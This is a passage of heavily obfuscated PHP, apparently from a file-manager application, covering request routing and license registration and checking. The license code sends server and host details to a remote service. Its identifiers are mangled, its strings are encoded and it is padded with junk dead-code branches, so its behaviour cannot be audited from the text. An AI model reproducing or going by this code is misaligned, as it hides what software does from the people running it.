$ÓÚòĞ˜é); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\157\160\x74\151\x6f\x6e"; protected $jsonField = array("\x6d\145\156\165", "\x72\x6f\x6c\x65", "\162\157\x6c\145\107\162\157\x75\x70", "\x72\145\147\x69\x73\x74", "\x65\x6d\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ûºÈñäˆ) { return "\x53\x79\x73\164\145\x6d\117\x70\x74\x69\x6f\x6e\x5f{$ûºÈñäˆ}"; } protected function optionDefault($×œ“” = '') { $¦Ñ–¦¶© =& $_SERVER[® ¨Ä®ñ]; if ($×œ“” == $¦Ñ–¦¶©[12]) { return $GLOBALS[$¦Ñ–¦¶©[6]][$¦Ñ–¦¶©[376]]; } } } goto cŒå‘¯ÒÁ; E½Û“Â—õ‰: $pxyivukjzt = $_SERVER[® ¨Ä®ñ][600]; class Application { private $defaultModule = "\151\156\x64\145\170"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($·°Å „º) { $†æ­Àá» =& $_SERVER[® ¨Ä®ñ]; $ñÌäÊ£ü =& $_SERVER[û„Ñáçœ]; $æ«…õ® = explode($ñÌäÊ£ü[0], trim($·°Å „º, $ñÌäÊ£ü[0])); $this->defaultModule = $æ«…õ®[0] ? $æ«…õ®[0] : $this->defaultModule; $„£ÙÇíô = $†æ­Àá»[601]; if (!$„£ÙÇíô) { die; } $this->defaultController = $æ«…õ®[1] ? $æ«…õ®[1] : $this->defaultController; $ÃŒÇªÄ˜ = $†æ­Àá»[602]; if (strlen($ÃŒÇªÄ˜) < $†æ­Àá»[603]) { die; } $this->defaultAction = $æ«…õ®[2] ? $æ«…õ®[2] : $this->defaultAction; $¿ÂÀ“æÛ = $†æ­Àá»[604]; if (!$¿ÂÀ“æÛ) { return; } $this->cmuza54325d2($ñÌäÊ£ü[1], array($this, $ñÌäÊ£ü[2])); } public function appRun($ ¥İë©İ) { $¯è¦£† =& $_SERVER[® ¨Ä®ñ]; $ĞßûÅ» =& $_SERVER[û„Ñáçœ]; $Å¨õ‚İ… = explode($ĞßûÅ»[0], $ ¥İë©İ); $Õ„ëöè = $¯è¦£†[605]; if (!$Õ„ëöè) { die; } $ƒá÷Ú®ü = strtolower($Å¨õ‚İ…[0]); $İÛòĞ… = $ĞßûÅ»[3]; $¦­ÀÄ¶£ = $¯è¦£†[606]; if (strlen($¦­ÀÄ¶£) < $¯è¦£†[607]) { die; } if ($ƒá÷Ú®ü == $ĞßûÅ»[4]) { $İÛòĞ… = $ĞßûÅ»[5]; $Å¨õ‚İ…[0] = $ĞßûÅ»[6]; $Å¨õ‚İ…[1] = $Å¨õ‚İ…[1] . $ĞßûÅ»[7]; $ ¥İë©İ = join($ĞßûÅ»[0], $Å¨õ‚İ…); $ ¥İë©İ = trim($ ¥İë©İ, $ĞßûÅ»[0]); } call_user_func(array($ĞßûÅ»[8], $ĞßûÅ»[9]), $İÛòĞ… . $ĞßûÅ»[10], $ ¥İë©İ); ActionCall($ ¥İë©İ); call_user_func(array($ĞßûÅ»[8], $ĞßûÅ»[9]), $İÛòĞ… . $ĞßûÅ»[11], $ ¥İë©İ); } private function autorun() { $Ïüš¥¤» =& $_SERVER[® ¨Ä®ñ]; $±ÆùÆ×² =& $_SERVER[û„Ñáçœ]; global $config; if (count($config[$±ÆùÆ×²[12]]) == 0) { return; } foreach ($config[$±ÆùÆ×²[12]] as $ñÏâõï€ => $›´µë) { $this->appRun($›´µë); $‰áßª´© = $Ïüš¥¤»[608]; while (strlen($‰áßª´©) < $Ïüš¥¤»[607]) { if (!$‰áßª´©) { break; } $‰áßª´©++; } } } private function uikra4c5c2dd() { $ãóĞ”’ =& $_SERVER[® ¨Ä®ñ]; $˜™ºóÑë =& $_SERVER[û„Ñáçœ]; $™§¹Éï = $˜™ºóÑë[4]; $¹Ìóè‡È = $GLOBALS[$˜™ºóÑë[13]][$˜™ºóÑë[14]][0]; if (!$¹Ìóè‡È || strlen($¹Ìóè‡È) <= strlen($™§¹Éï)) { return; } if (strtolower(substr($¹Ìóè‡È, -strlen($™§¹Éï))) != $™§¹Éï) { return; } $“í¼¯èî = substr($¹Ìóè‡È, 0, -strlen($™§¹Éï)); $ğå±Ç®° = array($˜™ºóÑë[4], $“í¼¯èî); $éï‰ÃÀõ = $ãóĞ”’[609]; if (strlen($éï‰ÃÀõ) < $ãóĞ”’[610]) { die; } $·àĞåüÔ = array_slice($GLOBALS[$˜™ºóÑë[13]][$˜™ºóÑë[14]], 1); $…—¨ã÷¢ = $ãóĞ”’[611]; if (strlen($…—¨ã÷¢) < $ãóĞ”’[612]) { return; } $GLOBALS[$˜™ºóÑë[13]][$˜™ºóÑë[14]] = array_merge($ğå±Ç®°, $·àĞåüÔ); $Éµ¸ÀÊÚ = $ãóĞ”’[613]; while ($Éµ¸ÀÊÚ < $ãóĞ”’[612]) { if ($Éµ¸ÀÊÚ >= 0) { break; } $Éµ¸ÀÊÚ++; } $GLOBALS[$˜™ºóÑë[13]][$˜™ºóÑë[15]] = implode($˜™ºóÑë[0], $GLOBALS[$˜™ºóÑë[13]][$˜™ºóÑë[14]]); $¾çô°õ¹ = $ãóĞ”’[614]; if (strlen($¾çô°õ¹) < $ãóĞ”’[603]) { die; } } private function fvgjd2767d15() { $Šª•üÜê =& $_SERVER[® ¨Ä®ñ]; $‚ƒü¦¾© =& $_SERVER[û„Ñáçœ]; if ($GLOBALS[$‚ƒü¦¾©[13]][$‚ƒü¦¾©[15]] != $‚ƒü¦¾©[6]) { return; } $ÅşÌÔ™ñ = $_SERVER[$‚ƒü¦¾©[16]]; $’í´Äµà = $‚ƒü¦¾©[17]; $Ìù¸‘ùÁ = $Šª•üÜê[615]; if (!$Ìù¸‘ùÁ) { return; } if (!strstr($ÅşÌÔ™ñ, $’í´Äµà)) { return; } $ßŠŸéÁ = strrpos($ÅşÌÔ™ñ, $’í´Äµà); $ÛƒË¢Å« = $Šª•üÜê[616]; if (!$ÛƒË¢Å«) { return; } $ÇºÛ­ĞÅ = substr($ÅşÌÔ™ñ, $ßŠŸéÁ + strlen($’í´Äµà)); $ğÇÊâ¿¼ = $Šª•üÜê[617]; preg_match_all($‚ƒü¦¾©[18], $ÇºÛ­ĞÅ, $¨Ô“Îûò); $ÇºÛ­ĞÅ = trim($¨Ô“Îûò[0][0], $‚ƒü¦¾©[19]); $şÒœ™¸ = $Šª•üÜê[618]; if (!$şÒœ™¸) { return; } $GLOBALS[$‚ƒü¦¾©[13]][$‚ƒü¦¾©[14]] = explode($‚ƒü¦¾©[19], $ÇºÛ­ĞÅ); $·â°ğüÂ = $Šª•üÜê[619]; if (!$·â°ğüÂ) { return; } $GLOBALS[$‚ƒü¦¾©[13]][$‚ƒü¦¾©[15]] = implode($‚ƒü¦¾©[0], $GLOBALS[$‚ƒü¦¾©[13]][$‚ƒü¦¾©[14]]); $£ü¦óñ™ = $Šª•üÜê[620]; } public function run() { $¼Õµòı÷ =& $_SERVER[® ¨Ä®ñ]; $şŒ“ß†Ü =& $_SERVER[û„Ñáçœ]; $this->fvgjd2767d15(); $ÒËş¬ôß = $¼Õµòı÷[621]; $this->uikra4c5c2dd(); $İš¾‘‰Œ = $¼Õµòı÷[622]; while ($İš¾‘‰Œ < $¼Õµòı÷[623]) { if ($İš¾‘‰Œ >= 0) { break; } $İš¾‘‰Œ++; } $¦Û½ÔòÁ = $GLOBALS[$şŒ“ß†Ü[13]][$şŒ“ß†Ü[14]]; $ıŒ¢÷¹ó = $¼Õµòı÷[624]; if (strlen($ıŒ¢÷¹ó) < $¼Õµòı÷[610]) { return; } $¶¡§îçÊ = $GLOBALS[$şŒ“ß†Ü[13]][$şŒ“ß†Ü[15]]; define($şŒ“ß†Ü[20], isset($¦Û½ÔòÁ[0]) && $¦Û½ÔòÁ[0] ? $¦Û½ÔòÁ[0] : $this->defaultModule); $îç™íò = $¼Õµòı÷[625]; while ($îç™íò < $¼Õµòı÷[603]) { if ($îç™íò >= 0) { break; } $îç™íò++; } define($şŒ“ß†Ü[21], isset($¦Û½ÔòÁ[1]) && $¦Û½ÔòÁ[0] ? $¦Û½ÔòÁ[1] : $this->defaultController); define($şŒ“ß†Ü[22], isset($¦Û½ÔòÁ[2]) && $¦Û½ÔòÁ[0] ? $¦Û½ÔòÁ[2] : $this->defaultAction); $æÜû¨—× = $¼Õµòı÷[626]; if (!$æÜû¨—×) { return; } define($şŒ“ß†Ü[23], MOD . $şŒ“ß†Ü[0] . ST . $şŒ“ß†Ü[0] . ACT); $_SERVER[$şŒ“ß†Ü[24]] = strtolower(ACTION); $this->autorun(); if (count($¦Û½ÔòÁ) >= 3) { $this->appRun($¶¡§îçÊ); } else { $this->appRun(ACTION); } } private $qyzcca47e197 = array(); private $dwpne412b601 = ''; public function huvr2d03c373() { $“»€à‘’ =& $_SERVER[® ¨Ä®ñ]; $îŠ«İ¤ =& $_SERVER[û„Ñáçœ]; $this->trdx085b683d(); $¹¢êšª› = $“»€à‘’[627]; while ($¹¢êšª› < $“»€à‘’[610]) { if ($¹¢êšª› >= 0) { break; } $¹¢êšª›++; } $this->hdxb72f30648(); $Ï»‘šÁã = $“»€à‘’[628]; $this->wdeld73be30b(); $this->reis7710b530(); $this->ftjx1261c1e4(); $this->spqna217b455(); $this->bhlu1fb133a3(); $this->cmuza54325d2($îŠ«İ¤[25], array($this, $îŠ«İ¤[26])); $this->cmuza54325d2($îŠ«İ¤[27], array($this, $îŠ«İ¤[28])); $œ¨‡¾»À = $“»€à‘’[629]; while (strlen($œ¨‡¾»À) < $“»€à‘’[603]) { if (!$œ¨‡¾»À) { break; } $œ¨‡¾»À++; } $this->cmuza54325d2($îŠ«İ¤[29], array($this, $îŠ«İ¤[30])); $this->cmuza54325d2($îŠ«İ¤[31], array($this, $îŠ«İ¤[32])); } public function mopu622427f6($Ñßï¾Ì¡) { $©’…ş¹ =& $_SERVER[® ¨Ä®ñ]; $µ°­”„ =& $_SERVER[û„Ñáçœ]; $¤«ˆ¤Ã– = Model($µ°­”„[33])->get(); $Ææ»¾Æ = array($µ°­”„[34], $µ°­”„[35], $µ°­”„[36], $µ°­”„[37], $µ°­”„[38], $µ°­”„[39], $µ°­”„[40], $µ°­”„[41], $µ°­”„[42], $µ°­”„[43], $µ°­”„[44], $µ°­”„[45], $µ°­”„[46], $µ°­”„[47], $µ°­”„[48], $µ°­”„[49], $µ°­”„[50], $µ°­”„[51], $µ°­”„[52], $µ°­”„[53], $µ°­”„[54], $µ°­”„[55], $µ°­”„[56], $µ°­”„[57], $µ°­”„[58], $µ°­”„[59], $µ°­”„[60], $µ°­”„[61], $µ°­”„[62], $µ°­”„[63], $µ°­”„[64], $µ°­”„[65], $µ°­”„[66], $µ°­”„[67], $µ°­”„[68], $µ°­”„[69], $µ°­”„[70], $µ°­”„[71], $µ°­”„[72], $µ°­”„[73], $µ°­”„[74], $µ°­”„[75], $µ°­”„[76], $µ°­”„[77], $µ°­”„[78], $µ°­”„[79], $µ°­”„[80], $µ°­”„[81], $µ°­”„[82]); $€íùïú¶ = $©’…ş¹[630]; foreach ($Ææ»¾Æ as $êãÍ›Î) { $ÔÉ¨‚ìÍ = $GLOBALS[$µ°­”„[83]][$µ°­”„[84]][$êãÍ›Î]; $à·² ËÙ = $©’…ş¹[631]; if (strlen($à·² ËÙ) < $©’…ş¹[623]) { return; } if (isset($¤«ˆ¤Ã–[$êãÍ›Î])) { $ÔÉ¨‚ìÍ = $¤«ˆ¤Ã–[$êãÍ›Î]; } $Ñßï¾Ì¡[$µ°­”„[85]][$µ°­”„[86]][$êãÍ›Î] = $ÔÉ¨‚ìÍ; } $ù†ËéËº = $Ñßï¾Ì¡[$µ°­”„[85]][$µ°­”„[86]][$µ°­”„[46]]; $‰…—ƒë = $©’…ş¹[632]; if (!$‰…—ƒë) { return; } unset($Ñßï¾Ì¡[$µ°­”„[85]][$µ°­”„[87]][$µ°­”„[88]]); unset($Ñßï¾Ì¡[$µ°­”„[85]][$µ°­”„[87]][$µ°­”„[89]]); unset($Ñßï¾Ì¡[$µ°­”„[85]][$µ°­”„[86]][$µ°­”„[46]]); $½ ßä½¤ = $©’…ş¹[633]; if (!$½ ßä½¤) { die; } unset($Ñßï¾Ì¡[$µ°­”„[85]][$µ°­”„[86]][$µ°­”„[90]]); $Ñßï¾Ì¡[$µ°­”„[85]][$µ°­”„[86]][$µ°­”„[91]] = array($µ°­”„[92] => (int) $ù†ËéËº[$µ°­”„[93]], $µ°­”„[94] => (int) _get($ù†ËéËº, $µ°­”„[95], 0)); $Ê›‚Ã—Ò = $©’…ş¹[634]; while (strlen($Ê›‚Ã—Ò) < $©’…ş¹[610]) { if (!$Ê›‚Ã—Ò) { break; } $Ê›‚Ã—Ò++; } $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[97]] = Action($µ°­”„[98])->accessToken(); $ŠĞË•Èù = $©’…ş¹[635]; if (strlen($ŠĞË•Èù) < $©’…ş¹[603]) { die; } $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[99]] = md5($_SERVER[$µ°­”„[100]] . $¤«ˆ¤Ã–[$µ°­”„[101]]); $´Î…ÜËÓ = $©’…ş¹[636]; if (strlen($´Î…ÜËÓ) < $©’…ş¹[612]) { die; } $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[102]] = base64_encode(serverInfo()); $ıœÂ‚Õ = $©’…ş¹[637]; if (!$ıœÂ‚Õ) { return; } $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[103]] = $this->dwpne412b601; if ($¤«ˆ¤Ã–[$µ°­”„[103]] != $µ°­”„[104]) { $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[105]] = $¤«ˆ¤Ã–[$µ°­”„[105]]; $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[106]] = $¤«ˆ¤Ã–[$µ°­”„[106]]; $ûÒÔÍÛ = rand_string(10) . $this->dwpne412b601 . rand_string(5); $Ñßï¾Ì¡[$µ°­”„[85]][$µ°­”„[107]][$µ°­”„[108]] = $this->rbtocb0b87ba($ûÒÔÍÛ, $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[99]]); } if ($this->dwpne412b601 == $µ°­”„[104]) { $Ñßï¾Ì¡[$µ°­”„[85]][$µ°­”„[86]][$µ°­”„[91]][$µ°­”„[95]] = 0; } $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[109]] = _get($this->qyzcca47e197, $µ°­”„[110], $µ°­”„[6]); $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[111]] = _get($this->qyzcca47e197, $µ°­”„[112], $µ°­”„[6]); $„ä­ú­á = $©’…ş¹[638]; if (!$„ä­ú­á) { die; } if (_get($GLOBALS, $µ°­”„[113]) && $this->config[$µ°­”„[114]]) { $Ñßï¾Ì¡[$µ°­”„[96]][$µ°­”„[115]] = WEB_ROOT; } return $Ñßï¾Ì¡; } private function spqna217b455() { $Å¨•©å‰ =& $_SERVER[® ¨Ä®ñ]; $¢õö’£à =& $_SERVER[û„Ñáçœ]; if ($_SERVER[$¢õö’£à[24]] == $¢õö’£à[116]) { $Öæ¸£ØÒ = array($¢õö’£à[103] => $this->dwpne412b601, $¢õö’£à[117] => $this->nblq95aa88fa(), $¢õö’£à[118] => Model($¢õö’£à[119])->count()); if ($this->dwpne412b601 != $¢õö’£à[104]) { $‡Œçœä = _get($this->qyzcca47e197, $¢õö’£à[120]); if ($‡Œçœä) { $Öæ¸£ØÒ[$¢õö’£à[121]] = $‡Œçœä; $Öæ¸£ØÒ[$¢õö’£à[122]] = strtotime(_get($this->qyzcca47e197, $¢õö’£à[123])); $Öæ¸£ØÒ[$¢õö’£à[124]] = _get($this->qyzcca47e197, $¢õö’£à[112]); } $‰öøüÛë = Model($¢õö’£à[33])->get($¢õö’£à[125], $¢õö’£à[6], !0); if (is_string($‰öøüÛë) && substr($‰öøüÛë, 0, 1) == $¢õö’£à[126]) { $‰öøüÛë = json_decode_force($‰öøüÛë); } if (is_array($‰öøüÛë) && $‰öøüÛë[$¢õö’£à[127]] && strstr($‰öøüÛë[$¢õö’£à[127]], $¢õö’£à[128])) { $ ¡âšÇ = explode($¢õö’£à[128], $‰öøüÛë[$¢õö’£à[127]]); $Öæ¸£ØÒ[$¢õö’£à[129]] = $ ¡âšÇ[0]; } } $Öæ¸£ØÒ = $this->avzq540a0502(json_encode($Öæ¸£ØÒ), md5($¢õö’£à[130])); $ ë÷˜ú° = $Å¨•©å‰[639]; if (!$ ë÷˜ú°) { die; } $ûşÈ¼¨µ = array($¢õö’£à[131] => $Öæ¸£ØÒ); $¹»½¥®É = $Å¨•©å‰[640]; if (strlen($¹»½¥®É) < $Å¨•©å‰[623]) { die; } call_user_func(array($¢õö’£à[132], $¢õö’£à[133]), $ûşÈ¼¨µ); } if ($this->dwpne412b601 == $¢õö’£à[104]) { return; } $ĞŞ™ÈÆ­ = array($¢õö’£à[134], $¢õö’£à[135], $¢õö’£à[136], $¢õö’£à[137], $¢õö’£à[138], $¢õö’£à[139]); $¨§ØÄÉÍ = Model($¢õö’£à[33])->get(); $ûşÈ¼¨µ = array($¢õö’£à[140] => $¨§ØÄÉÍ[$¢õö’£à[34]], $¢õö’£à[141] => $¨§ØÄÉÍ[$¢õö’£à[35]], $¢õö’£à[142] => $¢õö’£à[6]); $‚İ×”‡† = $Å¨•©å‰[641]; if (strlen($‚İ×”‡†) < $Å¨•©å‰[623]) { return; } foreach ($ĞŞ™ÈÆ­ as $•›úÒæ) { if (!isset($¨§ØÄÉÍ[$•›úÒæ]) || !$¨§ØÄÉÍ[$•›úÒæ]) { continue; } $ûşÈ¼¨µ[$•›úÒæ] = $¨§ØÄÉÍ[$•›úÒæ]; } call_user_func(array($¢õö’£à[132], $¢õö’£à[133]), $ûşÈ¼¨µ); } private function reis7710b530() { $âÖÉÊÃ¼ =& $_SERVER[® ¨Ä®ñ]; $Æª¶ñ® =& $_SERVER[û„Ñáçœ]; if ($_SERVER[$Æª¶ñ®[24]] != $Æª¶ñ®[143]) { return; } if (!_get($GLOBALS, $Æª¶ñ®[113])) { die; } $¿Ÿ½½í = $GLOBALS[$Æª¶ñ®[13]]; if (isset($¿Ÿ½½í[$Æª¶ñ®[144]])) { $this->ovtl1bd462cb(); die; } if (!isset($¿Ÿ½½í[$Æª¶ñ®[145]]) || strlen($¿Ÿ½½í[$Æª¶ñ®[145]]) != 16) { show_json($Æª¶ñ®[146] . $¿Ÿ½½í[$Æª¶ñ®[145]], !1); } $¼ŸÛü = Model($Æª¶ñ®[33])->get($Æª¶ñ®[101]); $¾ã¤ÄÕÓ = md5($_SERVER[$Æª¶ñ®[100]] . $¼ŸÛü); $€¤“ŠŸØ = array($Æª¶ñ®[145] => $¿Ÿ½½í[$Æª¶ñ®[145]], $Æª¶ñ®[147] => rand_string(16), $Æª¶ñ®[148] => $Æª¶ñ®[130], $Æª¶ñ®[149] => $Æª¶ñ®[150], $Æª¶ñ®[151] => $_SERVER[$Æª¶ñ®[152]], $Æª¶ñ®[153] => $_SERVER[$Æª¶ñ®[154]], $Æª¶ñ®[155] => $_SERVER[$Æª¶ñ®[156]], $Æª¶ñ®[99] => $¾ã¤ÄÕÓ, $Æª¶ñ®[157] => Model($Æª¶ñ®[33])->get($Æª¶ñ®[125])); if ($¿Ÿ½½í[$Æª¶ñ®[158]] == $Æª¶ñ®[159]) { $¾ÑÓšîƒ = $this->avzq540a0502($¾ã¤ÄÕÓ, $Æª¶ñ®[160]); $ˆ—­®Õı = $this->rbtocb0b87ba(json_encode($€¤“ŠŸØ), $¾ã¤ÄÕÓ . $Æª¶ñ®[161], 3); $ˆ—­®Õı = $ˆ—­®Õı . $Æª¶ñ®[162] . $_SERVER[$Æª¶ñ®[152]]; $âşîë³ = $this->uhgze8e69e71($Æª¶ñ®[163] . $¾ÑÓšîƒ . $Æª¶ñ®[164] . $ˆ—­®Õı, -1); show_json($âşîë³, !0); } else { if ($¿Ÿ½½í[$Æª¶ñ®[158]] == $Æª¶ñ®[165]) { $ß¬şÇšÑ = substr(md5($Æª¶ñ®[166] . $¾ã¤ÄÕÓ), 12, 15) . $Æª¶ñ®[167]; $ˆ—­®Õı = $this->jcabd39b6396(trim($¿Ÿ½½í[$Æª¶ñ®[168]]), $ß¬şÇšÑ, 2); $»åå—öç = json_decode($ˆ—­®Õı, !0); if (!is_array($»åå—öç) || !is_array($»åå—öç[$Æª¶ñ®[169]]) || $»åå—öç[$Æª¶ñ®[145]] != !0) { $£›¤êÒ– = $Æª¶ñ®[170]; $‘ŞÎâŠ  = $»åå—öç[$Æª¶ñ®[169]] ? $Æª¶ñ®[171] . $»åå—öç[$Æª¶ñ®[169]] : $£›¤êÒ–; show_json($‘ŞÎâŠ , !1); } else { $€¤“ŠŸØ[$Æª¶ñ®[147]] = $»åå—öç[$Æª¶ñ®[169]][$Æª¶ñ®[172]]; } } else { $»åå—öç = $this->uhgze8e69e71($Æª¶ñ®[173], $€¤“ŠŸØ, 10); } } if (!is_array($»åå—öç) || !is_array($»åå—öç[$Æª¶ñ®[169]]) || $»åå—öç[$Æª¶ñ®[145]] != !0) { $£›¤êÒ– = LNG($Æª¶ñ®[174]); $‘ŞÎâŠ  = $»åå—öç[$Æª¶ñ®[169]] ? $Æª¶ñ®[171] . $»åå—öç[$Æª¶ñ®[169]] : $£›¤êÒ–; show_json($‘ŞÎâŠ , !1); } $‹–­·É  = $»åå—öç[$Æª¶ñ®[169]]; $—Æ’Ÿ€£ = $this->osfkf8c40433($‹–­·É [$Æª¶ñ®[175]]); $•­ı÷¦å = $âÖÉÊÃ¼[642]; if (!$—Æ’Ÿ€£ || $—Æ’Ÿ€£ != $‹–­·É [$Æª¶ñ®[123]]) { $®Ã‰œ­¡ = array($Æª¶ñ®[176] => Model($Æª¶ñ®[33])->get($Æª¶ñ®[101]), $Æª¶ñ®[177] => $_SERVER[$Æª¶ñ®[100]], $Æª¶ñ®[178] => this_url(), $Æª¶ñ®[153] => $_SERVER[$Æª¶ñ®[154]]); $ˆ—­®Õı = $this->pqduf46c9b90(json_encode($®Ã‰œ­¡)); $this->uhgze8e69e71($Æª¶ñ®[179] . $ˆ—­®Õı); show_json(LNG($Æª¶ñ®[180]), !0); } $ç¨ƒî = array($Æª¶ñ®[181] => $‹–­·É [$Æª¶ñ®[182]], $Æª¶ñ®[183] => $‹–­·É [$Æª¶ñ®[184]], $Æª¶ñ®[185] => rand_string(16), $Æª¶ñ®[103] => $‹–­·É [$Æª¶ñ®[186]]); if ($€¤“ŠŸØ[$Æª¶ñ®[147]]) { $ç¨ƒî[$Æª¶ñ®[185]] = $€¤“ŠŸØ[$Æª¶ñ®[147]]; } $åË­¸Ú— = substr(md5($ç¨ƒî[$Æª¶ñ®[183]]), 10, 10); $å“ÙÌí = $åË­¸Ú— . $ç¨ƒî[$Æª¶ñ®[103]] . $ç¨ƒî[$Æª¶ñ®[185]]; $¬†’¾ƒ“ = $âÖÉÊÃ¼[643]; $ç¨ƒî[$Æª¶ñ®[105]] = strrev(base64_encode($this->avzq540a0502($å“ÙÌí, $Æª¶ñ®[187]))); $µƒ‘”Ò = $âÖÉÊÃ¼[644]; $Â£“ÎÛ® = rand_string(16); $ÖŞ–ƒë = $âÖÉÊÃ¼[645]; $ë€ÇÕÜÏ = $Â£“ÎÛ® . $ç¨ƒî[$Æª¶ñ®[103]] . $this->avzq540a0502(md5($ç¨ƒî[$Æª¶ñ®[181]]), $Â£“ÎÛ®); $ç¨ƒî[$Æª¶ñ®[106]] = base64_encode(strrev($this->avzq540a0502($ë€ÇÕÜÏ, $Æª¶ñ®[188]))); if ($‹–­·É [$Æª¶ñ®[189]] && $‹–­·É [$Æª¶ñ®[189]] >= 1) { Model($Æª¶ñ®[33])->setDeep($Æª¶ñ®[190], $Æª¶ñ®[191]); } Model($Æª¶ñ®[33])->set($ç¨ƒî); $ÙôçßÈ = md5($_SERVER[$Æª¶ñ®[100]] . strrev($¼ŸÛü) . $ç¨ƒî[$Æª¶ñ®[183]]); $©‰÷¸Üı = $âÖÉÊÃ¼[646]; if (strlen($©‰÷¸Üı) < $âÖÉÊÃ¼[607]) { die; } $ãÅ‰ùëë = strrev(substr($ÙôçßÈ, 10, 16)); $ü§¼Ùåñ = $âÖÉÊÃ¼[647]; if (!$ü§¼Ùåñ) { die; } $Ãú›ÇÙï = $this->rbtocb0b87ba(json_encode($‹–­·É ), $ÙôçßÈ); $¥¬­‚ûº = $âÖÉÊÃ¼[648]; if (!$¥¬­‚ûº) { die; } $œ‹‘…ÖÍ = array_to_keyvalue(Model($Æª¶ñ®[7])->listData(), $Æª¶ñ®[192]); $ù¼¹’Ïğ = $âÖÉÊÃ¼[649]; if (strlen($ù¼¹’Ïğ) < $âÖÉÊÃ¼[612]) { die; } $à–±‰ŒÈ = $œ‹‘…ÖÍ[$Æª¶ñ®[193]]; $¸Æ¼§’ = $âÖÉÊÃ¼[650]; while ($¸Æ¼§’ < $âÖÉÊÃ¼[603]) { if ($¸Æ¼§’ >= 0) { break; } $¸Æ¼§’++; } $¢Ş“³° = array(); $Ë¸ºøúë = $âÖÉÊÃ¼[651]; while (strlen($Ë¸ºøúë) < $âÖÉÊÃ¼[612]) { if (!$Ë¸ºøúë) { break; } $Ë¸ºøúë++; } $¢Ş“³°[$ãÅ‰ùëë] = $Ãú›ÇÙï; $‘èïì™É = $âÖÉÊÃ¼[652]; while ($‘èïì™É < $âÖÉÊÃ¼[623]) { if ($‘èïì™É >= 0) { break; } $‘èïì™É++; } Model($Æª¶ñ®[7])->update($à–±‰ŒÈ[$Æª¶ñ®[194]], array($Æª¶ñ®[195] => $¢Ş“³°)); $‘›ğü¿µ = $âÖÉÊÃ¼[653]; $this->qyzcca47e197 = $‹–­·É ; $this->dwpne412b601 = $ç¨ƒî[$Æª¶ñ®[103]]; $üèßİ×Š = $âÖÉÊÃ¼[654]; while (strlen($üèßİ×Š) < $âÖÉÊÃ¼[610]) { if (!$üèßİ×Š) { break; } $üèßİ×Š++; } $this->licenseRegistSuccess(); $êˆÁ Å = $âÖÉÊÃ¼[655]; if (!$êˆÁ Å) { die; } Cache::set($Æª¶ñ®[196] . md5($¼ŸÛü . $Æª¶ñ®[197]), $Æª¶ñ®[6]); $à¶ÀÍ¯ = $âÖÉÊÃ¼[656]; while (strlen($à¶ÀÍ¯) < $âÖÉÊÃ¼[623]) { if (!$à¶ÀÍ¯) { break; } $à¶ÀÍ¯++; } show_json(LNG($Æª¶ñ®[180]), !0); $Øü‚ååé = $âÖÉÊÃ¼[657]; if (strlen($Øü‚ååé) < $âÖÉÊÃ¼[607]) { return; } } private function licenseRegistSuccess() { $ŠÊŠØ’ =& $_SERVER[û„Ñáçœ]; $´óÛáŸø = Model($ŠÊŠØ’[33])->get(); $¤¿ªüÇÛ = $_SERVER[® ¨Ä®ñ][658]; if (!$¤¿ªüÇÛ) { die; } if ($´óÛáŸø[$ŠÊŠØ’[63]] != $ŠÊŠØ’[191]) { Model($ŠÊŠØ’[33])->set($ŠÊŠØ’[63], $ŠÊŠØ’[191]); } Action($ŠÊŠØ’[198])->initStart(!0); } private function ovtl1bd462cb() { $ø’‘í =& $_SERVER[® ¨Ä®ñ]; $ıœ© îÃ =& $_SERVER[û„Ñáçœ]; Model($ıœ© îÃ[33])->set(array($ıœ© îÃ[181] => $ıœ© îÃ[6], $ıœ© îÃ[183] => $ıœ© îÃ[6], $ıœ© îÃ[103] => $ıœ© îÃ[104], $ıœ© îÃ[105] => $ıœ© îÃ[6], $ıœ© îÃ[106] => $ıœ© îÃ[6])); Model($ıœ© îÃ[33])->setDeep($ıœ© îÃ[190], $ıœ© îÃ[199]); $ıÂûØä = $ø’‘í[659]; if (strlen($ıÂûØä) < $ø’‘í[603]) { return; } $this->qyzcca47e197 = array(); $this->dwpne412b601 = $ıœ© îÃ[104]; $ü•â–ñ… = $ø’‘í[660]; } private function trdx085b683d() { $´—Ç§á± =& $_SERVER[® ¨Ä®ñ]; $å˜½®µ =& $_SERVER[û„Ñáçœ]; $_SERVER[$å˜½®µ[154]] = _get($_SERVER, $å˜½®µ[154], APP_HOST); $this->dwpne412b601 = $å˜½®µ[104]; $¸¥Áëöù = Model($å˜½®µ[33])->get(); if ($¸¥Áëöù[$å˜½®µ[103]] == $å˜½®µ[104]) { return; } $Á¿‡«Ã³ = Model($å˜½®µ[33])->get($å˜½®µ[101]); $üÖûŸø­ = $´—Ç§á±[661]; $×øÇ„Î„ = $å˜½®µ[196] . md5($Á¿‡«Ã³ . $å˜½®µ[197]); $ËĞ’™ ó = Cache::get($×øÇ„Î„); $åğö©ş = $´—Ç§á±[662]; if (!$åğö©ş) { die; } if (!is_array($ËĞ’™ ó) || !isset($ËĞ’™ ó[$å˜½®µ[200]]) || time() - $ËĞ’™ ó[$å˜½®µ[200]] >= 60) { $›ôäßã‘ = Model($å˜½®µ[7])->loadList(); $¹èâùÇ³ = $›ôäßã‘[$å˜½®µ[193]]; $ÎşßåúÕ = md5($_SERVER[$å˜½®µ[100]] . strrev($Á¿‡«Ã³) . $¸¥Áëöù[$å˜½®µ[183]]); $ ‚÷ú¨† = strrev(substr($ÎşßåúÕ, 10, 16)); $ËĞ’™ ó = $this->jcabd39b6396($¹èâùÇ³[$å˜½®µ[83]][$ ‚÷ú¨†], $ÎşßåúÕ); $ËĞ’™ ó = json_decode($ËĞ’™ ó, !0); } if (!is_array($ËĞ’™ ó)) { return $this->ovtl1bd462cb(); } $Û‹Ì•‡Õ = strtotime($ËĞ’™ ó[$å˜½®µ[123]]); if (time() >= $Û‹Ì•‡Õ) { return 